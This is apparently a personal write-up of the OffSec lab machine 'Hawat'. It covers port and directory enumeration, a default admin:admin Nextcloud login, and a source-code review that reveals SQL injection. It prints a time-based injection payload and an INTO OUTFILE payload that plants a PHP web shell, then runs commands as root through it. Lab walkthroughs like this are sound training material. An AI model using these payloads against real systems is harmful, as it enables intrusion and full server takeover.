---
title: "Hawat"
date: 20-01-2026
categories: [Offsec, Linux Offsec, Active]
tags: [Password Bruteforce, Source Code, SQL Injection, PHP, phpinfo]
image: /assets/images/Hawat/logo.jpg
---

Hawat is considered an easy box by offsec. The host has a couple of ports open which are hosting different websites. On one of these websites we see that the `phpinfo.php` is readable which will come in handy later on. A website is hosting a version of Nextcloud which is using guessable credentials. After gaining access to the portal we can download the source code of one of the webpages the server is hosting. Reading the source code reveals that one endpoint in the website is vulnerable to a blind SQL injection. The data from the database does not result in anything but we are able to write a php shell and execute commands as the root user.

## Enumeration
An nmap scan reveals four ports open. Port 22 which is ssh and the other three are hosting some websites.

```
# Nmap 7.95 scan initiated Tue Jan 20 12:05:45 2026 as: /usr/lib/nmap/nmap --privileged -p22,111,139,443,445,17445,30455,50080 -sCV -Pn -n -oN nmap 192.168.205.147
Nmap scan report for 192.168.205.147
Host is up (0.043s latency).

PORT      STATE  SERVICE      VERSION
22/tcp    open   ssh          OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey: 
|   3072 78:2f:ea:84:4c:09:ae:0e:36:bf:b3:01:35:cf:47:22 (RSA)
|   256 d2:7d:eb:2d:a5:9a:2f:9e:93:9a:d5:2e:aa:dc:f4:a6 (ECDSA)
|_  256 b6:d4:96:f0:a4:04:e4:36:78:1e:9d:a5:10:93:d7:99 (ED25519)
17445/tcp open   http         Apache Tomcat (language: en)
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-title: Issue Tracker
30455/tcp open   http         nginx 1.18.0
|_http-title: W3.CSS
|_http-server-header: nginx/1.18.0
50080/tcp open   http         Apache httpd 2.4.46 ((Unix) PHP/7.4.15)
|_http-server-header: Apache/2.4.46 (Unix) PHP/7.4.15
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: W3.CSS Template

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jan 20 12:06:02 2026 -- 1 IP address (1 host up) scanned in 17.63 seconds
```

Using ffuf I enumerate the different directories in each website I was able to find an interesting file, phpinfo.php on one of the websites.
```
ffuf -w /opt/seclists/Discovery/Web-Content/raft-medium-files.txt -u http://192.168.205.147:30455/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.205.147:30455/FUZZ
 :: Wordlist         : FUZZ: /opt/seclists/Discovery/Web-Content/raft-medium-files.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

index.php               [Status: 200, Size: 3356, Words: 409, Lines: 122, Duration: 43ms]
!!phpinfo.php!!             [Status: 200, Size: 68625, Words: 3339, Lines: 744, Duration: 46ms]
```

![alt text](/assets/images/Hawat/phpinfo.png)

Other than that this website does not really have anything interesting so let's move on to the next one.
```
ffuf -w /opt/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://192.168.205.147:50080/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.205.147:50080/FUZZ
 :: Wordlist         : FUZZ: /opt/seclists/Discovery/Web-Content/raft-medium-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

images                  [Status: 301, Size: 244, Words: 14, Lines: 8, Duration: 47ms]
4                       [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 70ms]
!!cloud!!                   [Status: 301, Size: 243, Words: 14, Lines: 8, Duration: 44ms]
```

## Finding and Reading the Source Code for the Ticket App

The cloud endpoint looks interesting because it does not match the theme of the webpage so it might be something hidden. Navigating to the endpoint shows a Nextcloud instance. I was able to login with the classic `admin:admin` credentials.

![alt text](/assets/images/Hawat/cloud.png)

Looks like it is storing some files, the one that catches my eye is `issuetracker.zip` because that was the title of one the webpage that the server is hosting. Downloading the zip file and extracting it reveals the source code.

![alt text](/assets/images/Hawat/code.png)

Looking at the source code it is quite obvious that the application is vulnerable to sql injection because it is directly appending the priority variable into the sql statement without sanitization. Lets hit the endpoint and try to make the sql injection happen. The webpage wants a POST request so I append my payload to `priority` in burpsuite.

![alt text](/assets/images/Hawat/sql.png)

As you can see from the server took more than five seconds to reply which is a good thing since our payload made the server sleep for five seconds.
```sql
' union select sleep(5) -- -
```

## Writing a Web Shell and Gaining Root Access

I used sqlmap to dump the database contents but this was not the intended path. We can instead write a php shell. This is when that phpinfo from earlier comes in handy because it contains the path that the website is in. As we can see it was not in the default `/var/www/html` path, it was instead located in `/srv/http/`.

![alt text](/assets/images/Hawat/image.png)

We can write the php shell using the following payload:
```sql
priority=' union select '<?php system($_REQUEST[cmd]); ?>' into outfile '/srv/http/shell.php'-- - 
```

We can then navigate to `http://192.168.205.147:30455/shell.php` and hit our webshell using curl:
```
curl 'http://192.168.205.147:30455/shell.php?cmd=id'                              
uid=0(root) gid=0(root) groups=0(root)
```

The webserver is running as root so there is no need for privilege escalation.

